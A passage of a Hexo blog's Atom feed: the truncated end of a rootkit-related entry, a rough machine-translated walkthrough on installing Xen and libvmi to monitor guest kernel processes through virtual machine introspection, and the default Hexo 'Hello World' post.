memmove(&amp;amp;outputbuff[0],&amp;amp;a,4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&quot;https://baike.baidu.com/item/rootkit/6356777?fr=aladdin&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Rootkit&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Virtualization monitoring process</title>
    <link href="http://yoursite.com/2017/09/17/new%204/"/>
    <id>http://yoursite.com/2017/09/17/new 4/</id>
    <published>2017-09-17T09:03:02.957Z</published>
    <updated>2017-10-13T15:50:18.960Z</updated>
    
    <content type="html"><![CDATA[<p>With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit.</p><h2 id="Introduction-Doc"><a href="#Introduction-Doc" class="headerlink" title="Introduction Doc"></a>Introduction Doc</h2><h3 id="install-xen-on-the-ubuntu"><a href="#install-xen-on-the-ubuntu" class="headerlink" title="install xen on the ubuntu"></a>install xen on the ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install virt-manager</div><div class="line">$ sudo apt-get install xen-hypervisor-amd64</div><div class="line">$ sudo reboot</div><div class="line">$ sudo xl list(Check <span class="keyword">if</span> the installation is successful)</div></pre></td></tr></table></figure><p>Site of docu: <a href="https://xenserver.org/" target="_blank" rel="external">Xen</a></p><h3 id="The-virtual-machine-is-created-to-run"><a href="#The-virtual-machine-is-created-to-run" class="headerlink" title="The virtual machine is created to run"></a>The virtual machine is created to run</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update</div><div class="line">$ sudo apt-get -y install virt-manager qemu-system</div><div class="line">$ There is no need <span class="keyword">for</span> instructions here, as to download ubuntu system</div><div class="line">Attention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as follows</div><div class="line">Click on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, </div><div class="line">I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)</div><div class="line">The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The The</div><div class="line">installation. The The The The The The The The</div><div class="line">And <span class="keyword">then</span> <span class="built_in">type</span> the <span class="built_in">command</span> line $ sudo xl list on dom0, you can see xen monitor the two systems:</div></pre></td></tr></table></figure><p>More info: <a href="http://www.ubuntu.org.cn/index_kylin" target="_blank" rel="external">Ubuntu</a></p><h3 id="libvmi-variant-installation"><a href="#libvmi-variant-installation" class="headerlink" title="libvmi variant installation"></a>libvmi variant installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install libglib2.0-dev</div><div class="line">./autogen.sh</div><div class="line">If Error: could not find libtoolize or glibtoolize</div><div class="line">Solve: sudo apt-get install libtool</div><div class="line">2 ./autogen.sh</div><div class="line">  ./configure</div><div class="line">If missing xenstore</div><div class="line">Solve:sudo apt-get install libxen-dev... ...</div><div class="line">you just need to install whats the packge you need!</div><div class="line">sudo apt-get install check</div><div class="line">./autogen.sh</div><div class="line">./configure</div><div class="line"></div><div class="line">Last:View the files under libvmi-0.10.1 / example</div><div class="line">If you can find process-list、process-list.c、process-list.o,<span class="keyword">then</span> congratulation to you <span class="keyword">for</span> that you are successful!</div></pre></td></tr></table></figure><p>More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve for everyone!<br>More info: <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Formula: * p = p-pid;</div></pre></td></tr></table></figure><p>More info: According to the various versions of the operating system data structure Xie wrote the main function of the module and Makfile file<br>Formula: * p = p-pid;<br>Also perform a file to view the kernel data structure of the various defined macros as well as the operation<br>More info: <a href="http://blog.csdn.net/geekcome/article/details/6196044" target="_blank" rel="external">CSDN</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit.&lt;/p&gt;
&lt;h2 id=&quot;Introduction-Doc&quot;&gt;&lt;a href=&quot;#Introduction-Doc&quot; class=&quot;headerlink&quot; title=&quot;Introduction Doc&quot;&gt;&lt;/a&gt;Introduction Doc&lt;/h2&gt;&lt;h3 id=&quot;install-xen-on-the-ubuntu&quot;&gt;&lt;a href=&quot;#install-xen-on-the-ubuntu&quot; class=&quot;headerlink&quot; title=&quot;install xen on the ubuntu&quot;&gt;&lt;/a&gt;install xen on the ubuntu&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sudo apt-get install virt-manager&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ sudo apt-get install xen-hypervisor-amd64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ sudo reboot&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ sudo xl list(Check &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; the installation is successful)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Site of docu: &lt;a href=&quot;https://xenserver.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Xen&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;The-virtual-machine-is-created-to-run&quot;&gt;&lt;a href=&quot;#The-virtual-machine-is-created-to-run&quot; class=&quot;headerlink&quot; title=&quot;The virtual machine is created to run&quot;&gt;&lt;/a&gt;The virtual machine is created to run&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ sudo apt-get update&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ sudo apt-get -y install virt-manager qemu-system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ There is no need &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; instructions here, as to download ubuntu system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Attention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as follows&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Click on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The The&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;installation. The The The The The The The The&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;And &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; the &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; line $ sudo xl list on dom0, you can see xen monitor the two systems:&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&quot;http://www.ubuntu.org.cn/index_kylin&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ubuntu&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;libvmi-variant-installation&quot;&gt;&lt;a href=&quot;#libvmi-variant-installation&quot; class=&quot;headerlink&quot; title=&quot;libvmi variant installation&quot;&gt;&lt;/a&gt;libvmi variant installation&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1 sudo apt-get install libglib2.0-dev&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./autogen.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If Error: could not find libtoolize or glibtoolize&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Solve: sudo apt-get install libtool&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2 ./autogen.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  ./configure&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If missing xenstore&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Solve:sudo apt-get install libxen-dev... ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;you just need to install whats the packge you need!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sudo apt-get install check&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./autogen.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./configure&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last:View the files under libvmi-0.10.1 / example&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If you can find process-list、process-list.c、process-list.o,&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; congratulation to you &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; that you are successful!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve for everyone!&lt;br&gt;More info: &lt;a href=&quot;http://libvmi.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvmi&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Deploy-to-remote-sites&quot;&gt;&lt;a href=&quot;#Deploy-to-remote-sites&quot; class=&quot;headerlink&quot; title=&quot;Deploy to remote sites&quot;&gt;&lt;/a&gt;Deploy to remote sites&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Formula: * p = p-pid;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: According to the various versions of the operating system data structure Xie wrote the main function of the module and Makfile file&lt;br&gt;Formula: * p = p-pid;&lt;br&gt;Also perform a file to view the kernel data structure of the various defined macros as well as the operation&lt;br&gt;More info: &lt;a href=&quot;http://blog.csdn.net/geekcome/article/details/6196044&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSDN&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/09/13/hello-world/"/>
    <id>http://yoursite.com/2017/09/13/hello-world/</id>
    <published>2017-09-13T06:04:39.929Z</published>
    <updated>2017-09-13T06:04:39.929Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
